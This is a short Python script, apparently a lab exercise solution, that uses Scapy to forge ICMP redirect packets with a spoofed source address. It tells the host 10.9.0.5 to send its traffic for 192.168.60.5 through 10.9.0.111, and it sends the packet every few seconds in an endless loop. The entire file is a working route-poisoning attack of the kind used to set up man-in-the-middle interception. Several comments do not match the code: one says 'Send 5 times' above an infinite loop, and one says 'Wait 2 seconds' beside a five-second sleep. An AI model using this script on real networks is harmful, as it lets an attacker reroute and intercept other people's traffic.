import time
from scapy.all import IP, ICMP, send

ip = IP(src='10.9.0.11', dst='10.9.0.5')
icmp = ICMP(type=5, code=1)
icmp.gw = '10.9.0.111'
ip2 = IP(src='10.9.0.5', dst='192.168.60.5')

while(1):  # Send 5 times
    send(ip/icmp/ip2/ICMP())
#    print(f"[+] ICMP redirect sent ({i+1}/5)")
    time.sleep(5)  # Wait 2 seconds
